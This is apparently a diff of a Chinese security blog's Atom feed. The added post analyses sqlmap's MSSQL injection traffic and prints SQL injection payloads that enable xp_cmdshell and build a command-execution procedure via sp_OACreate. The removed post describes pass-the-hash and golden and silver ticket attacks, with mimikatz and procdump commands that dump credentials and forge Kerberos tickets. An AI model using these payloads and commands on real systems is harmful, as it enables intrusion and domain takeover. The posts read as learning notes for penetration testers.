@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chriskalix.github.io</id>
     <title>chriskali&apos;s blog</title>
-    <updated>2020-08-14T07:52:16.326Z</updated>
+    <updated>2020-08-17T02:28:27.520Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chriskalix.github.io"/>
     <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
@@ -10,6 +10,61 @@
     <logo>https://chriskalix.github.io/images/avatar.png</logo>
     <icon>https://chriskalix.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[老生常谈之Mssql注入]]></title>
+        <id>https://chriskalix.github.io/post/O9BI689Eo/</id>
+        <link href="https://chriskalix.github.io/post/O9BI689Eo/">
+        </link>
+        <updated>2020-08-15T14:47:12.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>注入，老话题了。但是实战中碰到时往往草草带过，稍一深入就要露馅了，基本功不扎实不行，趁热打铁，立刻补上</p>
+</blockquote>
+<h2 id="环境">环境</h2>
+<blockquote>
+<p>环境的安装是比较头疼的，也没啥好说的，直接搜索搭建就完事了</p>
+</blockquote>
+<p>sqlserver 2014<br>
+win10<br>
+php5.2.17</p>
+<h2 id="sqlmap行为分析">SQLmap行为分析</h2>
+<blockquote>
+<p>这里使用的方法是sqlmap，然后流量代理至本地burpsuite进行流量分析</p>
+</blockquote>
+<h3 id="普通判断">普通判断</h3>
+<p>首先，SQLmap会预先判断数据库，当判断完毕后，需要选择<br>
+<img src="https://chriskalix.github.io/post-images/1597507430917.png" alt="" loading="lazy"><br>
+这时候看一下sqlmap发了什么数据。首先总共发送了6个数据包，因为之前预先读过一小部分的sqlmap源码，但是由于实在是太大（我太懒），所以用半猜测半推断的方式进行分析<br>
+<img src="https://chriskalix.github.io/post-images/1597507581479.png" alt="" loading="lazy"><br>
+首先会发送一个预先判断的数据包，应该是判断是否存在WAF<br>
+<img src="https://chriskalix.github.io/post-images/1597507626390.png" alt="" loading="lazy"><br>
+之后通过两个数据包，猜测通过判断返回包的关键字判断了为mssql，之后的数据包太多了，我还是口述一下。默认的technique是全部的BEUSTQ，在尝试了所有注入类型后，Sqlmap给出结果。<br>
+<img src="https://chriskalix.github.io/post-images/1597507917353.png" alt="" loading="lazy"><br>
+即报错型，时间布尔型，堆叠注入都可以</p>
+<h3 id="关键的os-shell">关键的OS-shell</h3>
+<blockquote>
+<p>SQLmap中Os-shell的方式，之前在mysql中已经做过了解。先知中的<a href="https://xz.aliyun.com/t/7942">这篇文章</a>没有提到sqlserver怎么从注入点os-shell的，一时尴尬的我不知如何是好...</p>
+</blockquote>
+<p>首先，先发了4个包，剔除探活的就是3个<br>
+<img src="https://chriskalix.github.io/post-images/1597508231666.png" alt="" loading="lazy"><br>
+前面两个应该为报错型的数据，所以直接看最后的一个数据包<br>
+<img src="https://chriskalix.github.io/post-images/1597508739304.png" alt="" loading="lazy"><br>
+在返回中提示了xp_cmdshell插件没有开启，同时sqlmap也提示是否要重新启用该组件，之后的payload为如下所示，共有四个（剔除了校验xp_cmdshell是否开启的数据包）<br>
+包1，尝试直接开启xp_cmdshell，失败（语法错误</p>
+<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE-- HTTP/1.1
+</code></pre>
+<p>包2，把xp_cmdshell关了</p>
+<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',0; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
+</code></pre>
+<p>包3，启用<code>ole automation procedures</code>，语法错误</p>
+<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'ole automation procedures',1; RECONFIGURE WITH OVERRIDE--
+</code></pre>
+<p>包4，用sp_OACreate创建xp_cmdshell</p>
+<pre><code>test');DECLARE @hpzy nvarchar(999); SET @hpzy='CREATE PROCEDURE new_xp_cmdshell(@cmd varchar(255)) AS DECLARE @ID int EXEC sp_OACreate ''WScript.Shell'',@ID OUT EXEC sp_OAMethod @ID,''Run'',Null,@cmd,0,1 EXEC sp_OADestroy @ID'; EXEC master..sp_executesql @hpzy;RECONFIGURE WITH OVERRIDE--
+</code></pre>
+<p>上面一顿操作后，os-shell的结果是失败的（使用的是Error-based注入，那么time-based是否不一样呢？答：其实也是用xp_cmdshell，只是time-based建立了一个临时表，然后把xp_cmdshell的结果写道临时表里面，再读取出来。为什么出错了呢？猜测因为代码写的是query。<br>
+这里刚开始看的时候比较好奇，都已经sp_OAcreate了，为什么不直接执行命令就行了呢？后来发现这样执行其实是没有回显的......</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[dedecms老洞分析之 - CVE-2018-7700]]></title>
         <id>https://chriskalix.github.io/post/8IizO54vS/</id>
@@ -1431,248 +1486,6 @@ func b() {
 <p>循环发送udp，发到1000个左右的时候就报错 <code>bad file description</code>，<code>fd</code>相关的错误。看了一下<code>ulimit</code>的都没什么问题。查阅后发现，是因为我写的时候调用了<code>syscall.send</code>，打开了<code>fd</code>，但是没有调用<code>syscall.Close(fd)</code>导致堆积阻塞，出现这一问题的原因是我以为函数return后，应该会自动回收<code>fd</code>，然而事实不是这样的（这个应该算是<code>Linux</code>编程问题吧）</p>
 </li>
 </ol>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Windows认证&Kerberos&常见攻击]]></title>
-        <id>https://chriskalix.github.io/post/SXS4qCdRk/</id>
-        <link href="https://chriskalix.github.io/post/SXS4qCdRk/">
-        </link>
-        <updated>2020-06-17T06:58:22.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="1-windows本地认证">1. Windows本地认证</h2>
-<ul>
-<li>路径：<code>%SystemRoot%\system32\config\sam</code></li>
-<li>当我们登录系统的时候，系统会自动读取SAM文件中的&quot;密码&quot;与输入密码进行对比</li>
-</ul>
-<h3 id="ntlm-hash-nt-lan-manager"><strong>NTLM Hash</strong> (NT LAN Manager)</h3>
-<ul>
-<li>NTLM Hash是支持Net NTLM认证协议以及本地认证过程中的一个重要参与物，长度为32，由数字与字母组成。</li>
-<li>Windows本身不存储用户明文密码，它会将用户的明文经过加密算法后存储在SAM数据库中</li>
-<li>当用户登录时，明文也会加密成NTLM Hash，与SAM密码进行对比。NTLM Hash的前身是LM Hash，目前基本淘汰了（<strong>Windows Server 2008以前的系统还会用</strong>），但是依然存在</li>
-</ul>
-<p>NTLM Hash的产生：<br>
-<code>hex编码 -&gt; Unicode编码 -&gt; MD4</code></p>
-<p>LM Hash的产生：<br>
-小写转大写 -&gt; 转化为16进制分成2组，填充为14个字符 -&gt; 分成两组7字节的块 -&gt; 每组转化为比特流，不足56Bit在左边加0 -&gt; 将比特流按7比特一组，分出8组，末尾加0</p>
-<h3 id="本地认证流程图">本地认证流程图</h3>
-<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1592410797128.png" alt="" loading="lazy"></figure>
-<h2 id="2-windows网络认证-中间人攻击还没搞懂">2. Windows网络认证 - 中间人攻击还没搞懂</h2>
-<p>常见服务： SMB服务（端口445）</p>
-<h3 id="ntlm协议">NTLM协议</h3>
-<blockquote>
-<p>早期SMB协议明文传输。后来出现LM协议（Challenge/Response机制），到后来的NTLM机制，现在以及更新了NTLMv2以及Kerberos(域环境下)验证体系</p>
-</blockquote>
-<h4 id="挑战响应机制">挑战/响应机制</h4>
-<ol>
-<li>协商（确认协议版本）</li>
-<li>质询
-<ul>
-<li>客户端向服务器端发送用户信息（用户名）请求</li>
-<li>服务器接受到请求，生成一个16位的随机数，被称为&quot;Challenge&quot;，使用用户名对应的NTLM Hash机密Challenge（16位随机字符），生成Chanllenge1。同时，生成Challenge1后，将Challenge1发送给客户端。 // Net NTLM Hash = NTLM Hash(Challenge)</li>
-<li>客户端接受到Chanllege后，同样的方式进行加密，返回Response</li>
-<li>服务器端进行对比认证</li>
-</ul>
-</li>
-</ol>
-<p>流程图：<br>
-<img src="https://chriskalix.github.io/post-images/1592410807643.png" alt="" loading="lazy"></p>
-<h3 id="ntlm-v2协议">NTLM v2协议</h3>
-<p>区别点：</p>
-<ul>
-<li>NTLM v1和v2的区别就是Changllenge与加密算法不同，但用的都是NTLM Hash作为原料</li>
-<li>v1的Challenge 8位，v2为16位</li>
-<li>v1加密算法是Des，v2是HMAC-MD5</li>
-</ul>
-<p><strong>工具</strong>：<br>
-<code>Responder</code> | <code>smbexec</code> | <code>Inveigh</code></p>
-<h2 id="3-pthpass-the-hash哈希传递">3. <strong>PTH</strong>(Pass the hash)哈希传递</h2>
-<blockquote>
-<p>内网渗透中，经常需要抓取管理员密码，NTLM Hash，尤其是在域环境下，能帮助我们扩大战果</p>
-</blockquote>
-<ul>
-<li>什么是PTH<br>
-是一个不需要账户明文密码就能完成认证的一个技术</li>
-<li>作用<br>
-获取不到密码，破解不了NTLM Hash又想要扩大战果的问题</li>
-</ul>
-<h3 id="必要条件">必要条件</h3>
-<ol>
-<li>网络互达</li>
-<li>需要用户名</li>
-<li>需要NTLM Hash</li>
-</ol>
-<p>问：为什么需要用户名?<br>
-答：NTLM协议需要用户名，服务端需要用户名然后去读取</p>
-<h3 id="工具">工具</h3>
-<p><code>Smbmap</code> | <code>CrackMapExec</code> |  <code>Smbexec</code> | <code>Metasploit</code></p>
-<h3 id="相关问题">相关问题</h3>
-<p>如何使用 NTLMv1/v2（或者不常用的netNTLM）哈希进行传递哈希攻击？ @leesoh 坑人的问题，这些哈希都不能传递:&gt;</p>
-<h3 id="对应pth的手法问题">对应PTH的手法&amp;问题</h3>
-<p>对应手法：</p>
-<pre><code>LAPS
-</code></pre>
-<p>kb2871997：</p>
-<pre><code>内容 : 禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行wmi、PSEXEC、schtasks、at和访问文件共享
-这个补丁发布后常规的Pass The Hash已经无法成功，唯独默认的 Administrator (SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程连接
-</code></pre>
-<h2 id="4-kerberos认证机制非常重点">4. <strong>Kerberos认证机制</strong>(非常重点)</h2>
-<blockquote>
-<p>Kerberos是一种网络认证协议，不基于主机安全</p>
-</blockquote>
-<h3 id="域认证所有角色">域认证所有角色</h3>
-<ul>
-<li>Client</li>
-<li>Server</li>
-<li>KDC(Key Distribution Centor) = DC</li>
-</ul>
-<h3 id="详细流程图">详细流程图</h3>
-<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1592410833529.png" alt="" loading="lazy"></figure>
-<h2 id="5-pttpass-the-ticket攻击">5. PTT(Pass The Ticket)攻击</h2>
-<blockquote>
-<p>在了解完上述Kerberos后，这边自然地引申出PTT攻击（票据传递攻击）</p>
-</blockquote>
-<h3 id="golden-ticket-黄金票据">Golden Ticket (黄金票据)</h3>
-<blockquote>
-<p>该票据的利用条件是原先已成功取得域用户的HASH，尤其是krbtgt这个用户的。由于某些原因导致在控域网络失控，失去域管理员权限。现在你还有一个普通域用户权限，管理员在加固时没有重置krbtgt密码（非常常见），在此条件下，我们还能利用该票据重新获得域管理员权限</p>
-</blockquote>
-<p>利用krbtgt的HASH值可以伪造生成任意的TGT,能够绕过对任意用户的账号策略，能够让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
-<h4 id="前提条件">前提条件</h4>
-<p>域名称<br>
-域SID<br>
-域krbtgt的hash（意味着你已经有域控权限）<br>
-伪造的用户名（任意用户或者不存在的用户）</p>
-<h4 id="操作步骤">操作步骤</h4>
-<blockquote>
-<p>使用工具<code>mimikatz</code>(落地有杀软的话基本是杀的死死的，需要找个免杀版本)</p>
-</blockquote>
-<pre><code class="language-txt">还看到了用procdump.exe的，拖完拉到本地做
-procdump64.exe -accepteula -ma lsass.exe 存放路径\文件名
-mimikatz # sekurlsa::minidump 文件名
-mimikatz # sekurlsa::logonPasswords full
-</code></pre>
-<p>Mimikatz的操作：</p>
-<ol>
-<li>提取域用户krbtgt的NTLM Hash<br>
-<code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code></li>
-<li>查看域内所有用户的hash<br>
-<code>lsadump::dcsync /domain:yangdc.com /all /csv</code></li>
-<li>获取域sid<br>
-<code>whoami /all</code></li>
-<li>生成黄金票据<br>
-方法一：用AES256生成<br>
-<code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
-方法二：用NTLM Hash<br>
-<code>kerber::golden /domain:{域名称} /sid:{sid} /rc4:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
-在倾旋的视频里是：<br>
-<code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /rc4:{KRBTGT NTLM Hash} /user:{任意用户} /ptt&quot; exit</code></li>
-</ol>
-<h4 id="防御">防御</h4>
-<ol>
-<li>经常更换KRBTGT密码</li>
-<li>不允许域管账户登录其他服务器</li>
-</ol>
-<p>Msf的操作：<br>
-用<code>golden_ticket_create</code>生成，在<code>meterpreter</code>里。使用的时候使用kerberos_ticket_use</p>
-<h3 id="silver-ticket白银票据">Silver Ticket(白银票据)</h3>
-<blockquote>
-<p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信。这篇<a href="https://www.cnblogs.com/backlion/p/8119013.html">文章</a>挺好的</p>
-</blockquote>
-<h4 id="白银票据特点">白银票据特点</h4>
-<ol>
-<li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名</li>
-<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务</li>
-<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
-<li>攻击者需要服务帐户密码哈希值</li>
-<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过</li>
-<li>任何事件日志都在目标服务器上</li>
-</ol>
-<h4 id="前提条件-2">前提条件</h4>
-<p>域名称<br>
-域的SID<br>
-域中Server服务器账户的NTLM-Hash<br>
-伪造任意的用户名</p>
-<h4 id="操作步骤-2">操作步骤</h4>
-<blockquote>
-<p>同样的，老朋友Mimiktaz了</p>
-</blockquote>
-<p>Mimikatz:</p>
-<ul>
-<li>kerberos::list  查看票据</li>
-<li>kerberos::purge 清楚票据</li>
-</ul>
-<ol>
-<li>导出hash<br>
-mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;<br>
-或者 mimiktaz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt</li>
-<li>生成Sliver Ticket<pre><code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /target:{目标服务器主机名} /service:{服务类型}  /rc4:{NTLM Hash}  /user:{用户名} /ptt&quot; exit
-Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大
-</code></pre>
-还有一些其他的服务
-<table>
-<thead>
-<tr>
-<th style="text-align:right">务名称</th>
-<th style="text-align:center">需要的服务</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:right">MI</td>
-<td style="text-align:center">HOST、RPCSS</td>
-</tr>
-<tr>
-<td style="text-align:right">owerShell Remoting</td>
-<td style="text-align:center">HOST、HTTP</td>
-</tr>
-<tr>
-<td style="text-align:right">inRM</td>
-<td style="text-align:center">HOST、HTTP</td>
-</tr>
-<tr>
-<td style="text-align:right">cheduled Tasks</td>
-<td style="text-align:center">HOST</td>
-</tr>
-<tr>
-<td style="text-align:right">indows File Share</td>
-<td style="text-align:center">CIFS</td>
-</tr>
-<tr>
-<td style="text-align:right">DAP、<strong>DCSync</strong></td>
-<td style="text-align:center">LDAP</td>
-</tr>
-<tr>
-<td style="text-align:right">indows Remote Server</td>
-<td style="text-align:center">RPCSS、LDAP、CIFS</td>
-</tr>
-</tbody>
-</table>
-</li>
-</ol>
-<h4 id="针对白银票据的防御">针对白银票据的防御</h4>
-<p>开启PAC特权属性证书保护功能，PAC即是在步骤五收到了请求后，认证Client端发来的PAC(Privileged Attribute Certificate)。开启方式：将注册表中<code>HKEY_LOCAL\MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code>中的<code>ValidateKdcPacSignature</code>设置为1</p>
-<h2 id="6-windows-access-token简介">6. Windows Access Token简介</h2>
-<blockquote>
-<p>Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程的时候会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限</p>
-</blockquote>
-<ul>
-<li>一般情况下，用户双击运行一个程序，都会拷贝 &quot;explorer.exe&quot;的<code>Access Token</code>（问题：explorer.exe）</li>
-<li>Access Token一般分为主令牌和模拟令牌</li>
-<li><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除</strong></li>
-</ul>
-<h3 id="windows-access-token产生过程">Windows Access Token产生过程</h3>
-<p>每个进程创建时都会根据登录绘画权限，由LSA（Local Security Authority）分配一个Token（如果CreateProcess时指定了Token，则会使用该Token，否则用父进程的Token拷贝）</p>
-<h3 id="windows-access-token令牌假冒实战">Windows Access Token令牌假冒实战</h3>
-<ul>
-<li>Incognito(在Metasploit下集成，在meterpreter中直接load进来)<br>
-list_tokens -u<br>
-impersonate_token &quot;xxx\xxx&quot;</li>
-<li>Powershell - Invoke - TokenManipulation.ps1</li>
-<li>Cobalt Strike - steal_token</li>
-</ul>
-<h3 id="防御-2">防御</h3>
-<p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从而控制DC。想要清楚假冒，重启即可</p>
-<h2 id="7-扩展">7. 扩展</h2>
-<p>SPN扫描(20200618等待扩展ing)</p>
 ]]></content>
     </entry>
 </feed>
